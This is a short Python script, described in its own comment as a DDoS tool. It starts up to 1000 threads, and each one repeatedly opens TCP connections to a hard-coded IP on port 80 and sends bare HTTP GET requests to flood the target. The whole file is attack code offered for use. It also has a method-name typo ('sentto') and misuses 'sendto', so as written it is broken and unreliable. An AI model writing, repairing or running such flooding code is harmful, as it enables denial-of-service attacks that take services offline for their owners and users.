# making a DDOS script using python threads
import threading, socket, time

target = '192.168.100.1'
port = 80
http_header_ip = '176.167.164.15'

connected = 0

# making it rain in this funtion
def drill_through():
    print('indside the function now')
    while True:
        print('inside the loop, you are')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
        s.sentto(('GET /'+ target + ' HTTP/1.1\r\n').encode('ascii'),(target,port))
        s.sendto(('Host: ' + http_header_ip + '\r\n\r\n').encode('ascii'), (target,port))
        s.close()

        global connected
        connected += 1
        # if connected % 500:
        print(connected)
        print('Made contact ' + str(connected) + ' times.')

for iteration in range(1000):
    time.sleep(1)
    thread = threading.Thread(target=drill_through)
    thread.start()
